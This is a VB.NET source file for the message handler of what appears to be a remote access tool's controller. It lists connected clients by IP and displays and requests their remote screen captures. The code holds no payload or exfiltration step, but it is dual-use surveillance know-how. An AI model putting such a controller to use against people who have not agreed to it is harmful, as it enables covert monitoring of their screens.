Public Class Messages

    Public Shared F As Form1
    Delegate Sub _Read(ByVal C As Client, ByVal b() As Byte)

    Public Shared Async Sub Read(ByVal C As Client, ByVal b() As Byte)
        Try
            Dim A As String() = Split(BS(b), Settings.SPL)
            ' Console.WriteLine(BS(b))
            Select Case A(0)

                Case "INFO"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else

                        C.L = F.LV1.Items.Insert(0, C.IP.Split(":")(0))
                        C.L.Tag = C
                        For i As Integer = 1 To A.Length - 1
                            C.L.SubItems.Add(A(i))
                        Next
                        F.LV1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    End If
                    Exit Sub

                Case "RD-"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As RemoteDesktop = My.Application.OpenForms("RD" + C.IP)
                        If RD Is Nothing Then
                            RD = New RemoteDesktop
                            RD.F = F
                            RD.C = C
                            RD.Name = "RD" + C.IP
                            RD.Text = "RD" + C.IP
                            RD.Show()
                        End If
                    End If
                    Exit Sub

                Case "RD+"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else

                        Try
                            Dim RD As RemoteDesktop = My.Application.OpenForms("RD" + C.IP)
                            If RD IsNot Nothing Then
                                RD.Text = "RD" + C.IP + " " + _Size(b.LongLength)
                                Dim MM = New IO.MemoryStream(Text.Encoding.Default.GetBytes(A(1)))
                                RD.PictureBox1.Image = Image.FromStream(MM)
                                MM.Dispose()

                                '///

                                If RD.Button1.Text = "Capturing..." Then

                                    Try
                                        Dim M As New IO.MemoryStream
                                        Dim S As Byte() = SB("RD+" + Settings.SPL + RD.PictureBox1.Width.ToString + Settings.SPL + RD.PictureBox1.Height.ToString)
                                        Await M.WriteAsync(S, 0, S.Length)
                                        Await M.WriteAsync(SB(Settings.EOF), 0, Settings.EOF.Length)

                                        Dim x As Client = CType(C, Client)
                                        Try
                                            x.C.BeginSend(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf x.EndSend), C)
                                        Catch ex As Exception
                                            x.isDisconnected()
                                        End Try

                                        Try
                                            M.Dispose()
                                        Catch ex As Exception
                                        End Try

                                    Catch ex As Exception
                                    End Try

                                End If
                            End If
                        Catch ex As Exception
                        End Try
                    End If
                    Exit Sub

            End Select
            Exit Sub
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

End Class
